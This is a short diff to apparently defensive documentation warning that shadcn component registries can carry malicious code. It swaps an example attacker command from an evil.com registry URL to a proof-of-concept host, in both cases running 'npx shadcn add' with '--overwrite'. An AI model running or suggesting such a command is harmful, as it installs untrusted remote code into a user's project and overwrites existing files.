@@ -36,5 +36,5 @@ Shadcn registries let you install UI components quickly, but they can also inclu
 - For example, an attacker can run:
 
   ```bash
-  npx shadcn@latest add https://evil.com/registry.json --overwrite
+  npx shadcn@latest add https://shadcn-poc.surge.sh/fake-component.json --overwrite
   ```
